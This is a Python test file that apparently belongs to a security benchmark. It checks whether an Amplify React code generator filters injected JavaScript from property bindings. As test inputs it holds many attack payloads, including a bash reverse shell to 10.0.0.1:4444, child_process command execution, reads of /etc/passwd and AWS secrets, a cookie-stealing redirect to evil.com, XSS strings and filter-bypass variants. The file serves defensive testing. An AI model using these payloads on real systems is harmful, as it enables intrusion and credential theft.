"""
Vulnerability tests for the Amplify code generator.

These tests verify the input validation behavior for property bindings.
- FAIL in vulnerable state (dangerous patterns pass through to generated code)
- PASS in fixed state (dangerous patterns are filtered/sanitized)
"""

import subprocess
import json
import os
import pytest


class TestScriptInjectionPrevention:
    """
    Test that dangerous JavaScript patterns are filtered from property bindings.

    The code generator should sanitize property values before using them
    in generated code to prevent script injection.
    """

    @pytest.fixture(autouse=True)
    def setup(self):
        """Set up test environment."""
        self.app_dir = "/workspace"
        self.package_dir = os.path.join(self.app_dir, "packages", "codegen-ui-react")

    def run_codegen_and_get_output(self, property_value):
        """
        Run code generation with the given property value and return the generated code.
        Returns a dict with 'success', 'output', and 'contains_payload' keys.
        """
        component = {
            "id": "test-injection",
            "name": "TestComponent",
            "componentType": "Text",
            "schemaVersion": "1.0",
            "properties": {
                "content": {
                    "bindingProperties": {
                        "property": property_value,
                        "field": "data"
                    }
                }
            },
            "bindingProperties": {
                "testData": {
                    "type": "Data",
                    "bindingProperties": {
                        "model": "TestModel"
                    }
                }
            },
            "variants": [],
            "overrides": {},
            "children": []
        }

        test_script = f"""
const {{ AmplifyRenderer }} = require('{self.package_dir}');

const component = {json.dumps(component)};

try {{
    const renderer = new AmplifyRenderer(component, {{}});
    const result = renderer.renderComponent();
    console.log(JSON.stringify({{
        success: true,
        componentText: result.componentText || '',
        declaration: result.declaration || ''
    }}));
}} catch (error) {{
    console.log(JSON.stringify({{
        success: false,
        error: error.message
    }}));
}}
"""
        result = subprocess.run(
            ["node", "-e", test_script],
            capture_output=True,
            text=True,
            cwd=self.app_dir,
            timeout=30
        )

        try:
            parsed = json.loads(result.stdout.strip()) if result.stdout.strip() else {}
        except json.JSONDecodeError:
            parsed = {}

        output = parsed.get("componentText", "") + parsed.get("declaration", "")
        error = parsed.get("error", "")

        # Combine output and error for vulnerability detection
        # In vulnerable state, the malicious pattern appears in either output or error
        all_output = output + error + result.stderr

        return {
            "success": parsed.get("success", False),
            "output": output,
            "all_output": all_output,  # For vulnerability detection
            "error": error,
            "stdout": result.stdout,
            "stderr": result.stderr
        }

    # ==========================================================================
    # Test eval() injection patterns
    # ==========================================================================

    def test_eval_injection_basic(self):
        """Test that basic eval() patterns are filtered."""
        payload = "eval('alert(1)')"
        result = self.run_codegen_and_get_output(payload)

        # The payload should NOT appear in output or error (vulnerable if it does)
        assert "eval(" not in result["all_output"].lower(), \
            f"eval() pattern was not filtered: {result['all_output'][:500]}"

    def test_eval_injection_with_whitespace(self):
        """Test that eval() with whitespace variations is filtered."""
        payload = "eval  (  'malicious'  )"
        result = self.run_codegen_and_get_output(payload)

        assert "eval" not in result["all_output"].lower() or "malicious" not in result["all_output"], \
            f"eval() pattern with whitespace was not filtered: {result['all_output'][:500]}"

    def test_eval_injection_nested(self):
        """Test that nested eval patterns are filtered."""
        payload = "data; eval(atob('YWxlcnQoMSk=')); //"
        result = self.run_codegen_and_get_output(payload)

        assert "eval(" not in result["all_output"], \
            f"Nested eval pattern was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test require() injection patterns
    # ==========================================================================

    def test_require_injection_basic(self):
        """Test that require() patterns are filtered."""
        payload = "require('child_process').execSync('id')"
        result = self.run_codegen_and_get_output(payload)

        assert "require(" not in result["all_output"], \
            f"require() pattern was not filtered: {result['all_output'][:500]}"

    def test_require_injection_with_variable(self):
        """Test that require with variable modules is filtered."""
        payload = "require('fs').readFileSync('/etc/passwd')"
        result = self.run_codegen_and_get_output(payload)

        assert "require(" not in result["all_output"], \
            f"require() pattern was not filtered: {result['all_output'][:500]}"

    def test_require_injection_chained(self):
        """Test that chained require calls are filtered."""
        payload = "require('child_process').exec('whoami', (e,o)=>console.log(o))"
        result = self.run_codegen_and_get_output(payload)

        assert "require(" not in result["all_output"], \
            f"Chained require() was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test import() injection patterns
    # ==========================================================================

    def test_import_dynamic_injection(self):
        """Test that dynamic import() patterns are filtered."""
        payload = "import('fs').then(m=>m.readFileSync('/etc/passwd'))"
        result = self.run_codegen_and_get_output(payload)

        assert "import(" not in result["all_output"], \
            f"Dynamic import() was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test setTimeout/setInterval injection patterns
    # ==========================================================================

    def test_setTimeout_injection(self):
        """Test that setTimeout patterns are filtered."""
        payload = "setTimeout('alert(1)', 0)"
        result = self.run_codegen_and_get_output(payload)

        assert "setTimeout" not in result["all_output"], \
            f"setTimeout pattern was not filtered: {result['all_output'][:500]}"

    def test_setInterval_injection(self):
        """Test that setInterval patterns are filtered."""
        payload = "setInterval('malicious()', 1000)"
        result = self.run_codegen_and_get_output(payload)

        assert "setInterval" not in result["all_output"], \
            f"setInterval pattern was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test window/document/global access patterns
    # ==========================================================================

    def test_window_access_injection(self):
        """Test that window. access patterns are filtered."""
        payload = "window.location.href='http://evil.com'"
        result = self.run_codegen_and_get_output(payload)

        assert "window." not in result["all_output"], \
            f"window. access was not filtered: {result['all_output'][:500]}"

    def test_document_access_injection(self):
        """Test that document. access patterns are filtered."""
        payload = "document.cookie"
        result = self.run_codegen_and_get_output(payload)

        assert "document." not in result["all_output"], \
            f"document. access was not filtered: {result['all_output'][:500]}"

    def test_global_access_injection(self):
        """Test that global. access patterns are filtered."""
        payload = "global.process.env.SECRET"
        result = self.run_codegen_and_get_output(payload)

        assert "global." not in result["all_output"], \
            f"global. access was not filtered: {result['all_output'][:500]}"

    def test_process_access_injection(self):
        """Test that process. access patterns are filtered."""
        payload = "process.env.AWS_SECRET_KEY"
        result = self.run_codegen_and_get_output(payload)

        assert "process." not in result["all_output"], \
            f"process. access was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test prototype pollution patterns
    # ==========================================================================

    def test_prototype_pollution_basic(self):
        """Test that __proto__ patterns are filtered."""
        payload = "__proto__.polluted = true"
        result = self.run_codegen_and_get_output(payload)

        assert "__proto__" not in result["all_output"], \
            f"__proto__ pattern was not filtered: {result['all_output'][:500]}"

    def test_constructor_prototype_injection(self):
        """Test that constructor.prototype patterns are filtered."""
        payload = "constructor.prototype.polluted = 1"
        result = self.run_codegen_and_get_output(payload)

        assert "constructor" not in result["all_output"].lower() or "prototype" not in result["all_output"], \
            f"constructor.prototype pattern was not filtered: {result['all_output'][:500]}"

    def test_prototype_access(self):
        """Test that prototype. access patterns are filtered."""
        payload = "Object.prototype.hasOwnProperty"
        result = self.run_codegen_and_get_output(payload)

        assert "prototype." not in result["all_output"], \
            f"prototype. access was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test URL protocol injection patterns
    # ==========================================================================

    def test_javascript_protocol_injection(self):
        """Test that javascript: protocol is filtered."""
        payload = "javascript:alert(document.cookie)"
        result = self.run_codegen_and_get_output(payload)

        assert "javascript:" not in result["all_output"].lower(), \
            f"javascript: protocol was not filtered: {result['all_output'][:500]}"

    def test_data_protocol_injection(self):
        """Test that data: protocol is filtered."""
        payload = "data:text/html,<script>alert(1)</script>"
        result = self.run_codegen_and_get_output(payload)

        assert "data:" not in result["all_output"].lower() or "<script" not in result["all_output"].lower(), \
            f"data: protocol was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test HTML/XSS injection patterns
    # ==========================================================================

    def test_script_tag_injection(self):
        """Test that <script> tags are filtered."""
        payload = "<script>alert('xss')</script>"
        result = self.run_codegen_and_get_output(payload)

        assert "<script" not in result["all_output"].lower(), \
            f"<script> tag was not filtered: {result['all_output'][:500]}"

    def test_iframe_injection(self):
        """Test that <iframe> tags are filtered."""
        payload = "<iframe src='http://evil.com'></iframe>"
        result = self.run_codegen_and_get_output(payload)

        assert "<iframe" not in result["all_output"].lower(), \
            f"<iframe> tag was not filtered: {result['all_output'][:500]}"

    def test_event_handler_onclick(self):
        """Test that onclick handlers are filtered."""
        payload = "x onclick=alert(1)"
        result = self.run_codegen_and_get_output(payload)

        assert "onclick" not in result["all_output"].lower(), \
            f"onclick handler was not filtered: {result['all_output'][:500]}"

    def test_event_handler_onerror(self):
        """Test that onerror handlers are filtered."""
        payload = "x onerror=alert(1)"
        result = self.run_codegen_and_get_output(payload)

        assert "onerror" not in result["all_output"].lower(), \
            f"onerror handler was not filtered: {result['all_output'][:500]}"

    def test_event_handler_onload(self):
        """Test that onload handlers are filtered."""
        payload = "x onload=alert(1)"
        result = self.run_codegen_and_get_output(payload)

        assert "onload" not in result["all_output"].lower(), \
            f"onload handler was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test Function constructor injection
    # ==========================================================================

    def test_function_constructor_injection(self):
        """Test that Function constructor patterns are filtered."""
        payload = "Function('return this')()"
        result = self.run_codegen_and_get_output(payload)

        assert "Function(" not in result["all_output"], \
            f"Function constructor was not filtered: {result['all_output'][:500]}"

    # ==========================================================================
    # Test combined/complex injection patterns
    # ==========================================================================

    def test_combined_injection_eval_require(self):
        """Test complex injection combining multiple techniques."""
        payload = "eval(require('child_process').execSync('id').toString())"
        result = self.run_codegen_and_get_output(payload)

        assert "eval(" not in result["all_output"] and "require(" not in result["all_output"], \
            f"Combined eval+require injection was not filtered: {result['all_output'][:500]}"

    def test_obfuscated_eval_injection(self):
        """Test obfuscated eval patterns."""
        payload = "this['ev'+'al']('alert(1)')"
        result = self.run_codegen_and_get_output(payload)

        # In vulnerable state, the payload appears in either output or error
        # The vulnerability is that the dangerous expression is passed through
        # We check all_output to detect if the payload appears anywhere
        assert "alert(1)" not in result["all_output"], \
            f"Obfuscated eval pattern was not filtered: {result['all_output'][:500]}"

    def test_template_literal_injection(self):
        """Test template literal injection patterns."""
        payload = "${require('child_process').exec('id')}"
        result = self.run_codegen_and_get_output(payload)

        # Template literals should be escaped or filtered
        assert "require(" not in result["all_output"] or "${" not in result["all_output"], \
            f"Template literal injection was not filtered: {result['all_output'][:500]}"


class TestRealWorldExploitScenarios:
    """Test real-world exploit scenarios that would be used in actual attacks."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Set up test environment."""
        self.app_dir = "/workspace"
        self.package_dir = os.path.join(self.app_dir, "packages", "codegen-ui-react")

    def run_codegen_and_get_output(self, property_value):
        """Run code generation with the given property value."""
        component = {
            "id": "exploit-test",
            "name": "ExploitComponent",
            "componentType": "TextField",
            "schemaVersion": "1.0",
            "properties": {
                "placeholder": {
                    "bindingProperties": {
                        "property": property_value,
                        "field": "data"
                    }
                }
            },
            "bindingProperties": {},
            "variants": [],
            "overrides": {},
            "children": []
        }

        test_script = f"""
const {{ AmplifyRenderer }} = require('{self.package_dir}');

const component = {json.dumps(component)};

try {{
    const renderer = new AmplifyRenderer(component, {{}});
    const result = renderer.renderComponent();
    console.log(JSON.stringify({{
        success: true,
        componentText: result.componentText || '',
        declaration: result.declaration || ''
    }}));
}} catch (error) {{
    console.log(JSON.stringify({{
        success: false,
        error: error.message
    }}));
}}
"""
        result = subprocess.run(
            ["node", "-e", test_script],
            capture_output=True,
            text=True,
            cwd=self.app_dir,
            timeout=30
        )

        try:
            parsed = json.loads(result.stdout.strip()) if result.stdout.strip() else {}
        except json.JSONDecodeError:
            parsed = {}

        output = parsed.get("componentText", "") + parsed.get("declaration", "")
        error = parsed.get("error", "")
        all_output = output + error + result.stderr

        return {
            "success": parsed.get("success", False),
            "output": output,
            "all_output": all_output
        }

    def test_rce_command_execution(self):
        """Test RCE payload - command execution."""
        payload = "require('child_process').execSync('whoami').toString()"
        result = self.run_codegen_and_get_output(payload)

        assert "require(" not in result["all_output"] and "child_process" not in result["all_output"], \
            f"RCE payload was not filtered: {result['all_output'][:500]}"

    def test_rce_reverse_shell(self):
        """Test RCE payload - reverse shell attempt."""
        payload = "require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')"
        result = self.run_codegen_and_get_output(payload)

        assert "require(" not in result["all_output"], \
            f"Reverse shell payload was not filtered: {result['all_output'][:500]}"

    def test_file_read_exploit(self):
        """Test file read exploit."""
        payload = "require('fs').readFileSync('/etc/passwd').toString()"
        result = self.run_codegen_and_get_output(payload)

        assert "require(" not in result["all_output"], \
            f"File read payload was not filtered: {result['all_output'][:500]}"

    def test_env_exfiltration(self):
        """Test environment variable exfiltration."""
        payload = "process.env.AWS_SECRET_ACCESS_KEY"
        result = self.run_codegen_and_get_output(payload)

        assert "process." not in result["all_output"], \
            f"Env exfiltration payload was not filtered: {result['all_output'][:500]}"

    def test_dom_based_xss(self):
        """Test DOM-based XSS payload."""
        payload = "document.location='http://evil.com/steal?c='+document.cookie"
        result = self.run_codegen_and_get_output(payload)

        assert "document." not in result["all_output"], \
            f"DOM XSS payload was not filtered: {result['all_output'][:500]}"

    def test_stored_xss_via_property(self):
        """Test stored XSS via component property."""
        payload = "<img src=x onerror=alert(document.domain)>"
        result = self.run_codegen_and_get_output(payload)

        # Either the tag should be escaped or the onerror should be filtered
        assert "onerror" not in result["all_output"].lower() or "<img" not in result["all_output"].lower(), \
            f"Stored XSS payload was not filtered: {result['all_output'][:500]}"


class TestBypassAttempts:
    """Test common bypass techniques that attackers might use."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Set up test environment."""
        self.app_dir = "/workspace"
        self.package_dir = os.path.join(self.app_dir, "packages", "codegen-ui-react")

    def run_codegen_and_get_output(self, property_value):
        """Run code generation with the given property value."""
        component = {
            "id": "bypass-test",
            "name": "BypassComponent",
            "componentType": "Text",
            "schemaVersion": "1.0",
            "properties": {
                "content": {
                    "bindingProperties": {
                        "property": property_value,
                        "field": "data"
                    }
                }
            },
            "bindingProperties": {},
            "variants": [],
            "overrides": {},
            "children": []
        }

        test_script = f"""
const {{ AmplifyRenderer }} = require('{self.package_dir}');

const component = {json.dumps(component)};

try {{
    const renderer = new AmplifyRenderer(component, {{}});
    const result = renderer.renderComponent();
    console.log(JSON.stringify({{
        success: true,
        componentText: result.componentText || '',
        declaration: result.declaration || ''
    }}));
}} catch (error) {{
    console.log(JSON.stringify({{
        success: false,
        error: error.message
    }}));
}}
"""
        result = subprocess.run(
            ["node", "-e", test_script],
            capture_output=True,
            text=True,
            cwd=self.app_dir,
            timeout=30
        )

        try:
            parsed = json.loads(result.stdout.strip()) if result.stdout.strip() else {}
        except json.JSONDecodeError:
            parsed = {}

        output = parsed.get("componentText", "") + parsed.get("declaration", "")
        error = parsed.get("error", "")
        all_output = output + error + result.stderr

        return {
            "success": parsed.get("success", False),
            "output": output,
            "all_output": all_output
        }

    def test_case_variation_bypass_EVAL(self):
        """Test uppercase EVAL bypass attempt."""
        payload = "EVAL('alert(1)')"
        result = self.run_codegen_and_get_output(payload)

        # Case-insensitive matching should catch this
        assert "eval(" not in result["all_output"].lower(), \
            f"Uppercase EVAL bypass was not prevented: {result['all_output'][:500]}"

    def test_case_variation_bypass_mixed(self):
        """Test mixed case eVaL bypass attempt."""
        payload = "eVaL('alert(1)')"
        result = self.run_codegen_and_get_output(payload)

        assert "eval(" not in result["all_output"].lower(), \
            f"Mixed case eval bypass was not prevented: {result['all_output'][:500]}"

    def test_unicode_bypass_attempt(self):
        """Test unicode character bypass attempt."""
        # Using similar-looking unicode characters
        payload = "eval\u200b('alert(1)')"  # Zero-width space
        result = self.run_codegen_and_get_output(payload)

        # The filtering should handle or escape unicode
        # In vulnerable state, the payload appears in successful generated code
        # If generation fails, the bypass didn't produce executable code
        output_only = result["output"]  # Check only successful output, not errors
        assert "eval" not in output_only.lower() or "alert(1)" not in output_only or not result["success"], \
            f"Unicode bypass pattern was not filtered: {output_only[:500]}"

    def test_comment_injection_bypass(self):
        """Test JavaScript comment injection bypass."""
        payload = "eval/*comment*/('alert(1)')"
        result = self.run_codegen_and_get_output(payload)

        # Check successful output only - if generation fails, the bypass isn't exploitable
        output_only = result["output"]  # Check only successful output, not errors
        assert "eval" not in output_only.lower() or "alert" not in output_only or not result["success"], \
            f"Comment injection bypass was not prevented: {output_only[:500]}"

    def test_newline_bypass_attempt(self):
        """Test newline character bypass attempt."""
        payload = "eval\n('alert(1)')"
        result = self.run_codegen_and_get_output(payload)

        assert "eval(" not in result["all_output"].replace("\n", ""), \
            f"Newline bypass was not prevented: {result['all_output'][:500]}"

    def test_tab_bypass_attempt(self):
        """Test tab character bypass attempt."""
        payload = "eval\t('alert(1)')"
        result = self.run_codegen_and_get_output(payload)

        assert "eval(" not in result["all_output"].replace("\t", ""), \
            f"Tab bypass was not prevented: {result['all_output'][:500]}"

    def test_hex_encoding_bypass(self):
        """Test hex-encoded bypass attempt."""
        payload = "\\x65\\x76\\x61\\x6c('alert(1)')"  # hex for 'eval'
        result = self.run_codegen_and_get_output(payload)

        # In vulnerable state, the payload appears in either output or error
        # The vulnerability is that dangerous expressions are passed through
        assert "alert(1)" not in result["all_output"], \
            f"Hex-encoded bypass was not filtered: {result['all_output'][:500]}"

    def test_multiple_patterns_in_one(self):
        """Test payload with multiple dangerous patterns."""
        payload = "eval(require('child_process').execSync(document.cookie))"
        result = self.run_codegen_and_get_output(payload)

        dangerous_patterns = ["eval(", "require(", "child_process", "document."]
        found_patterns = [p for p in dangerous_patterns if p in result["all_output"]]

        assert len(found_patterns) == 0, \
            f"Multiple dangerous patterns found in output: {found_patterns}"
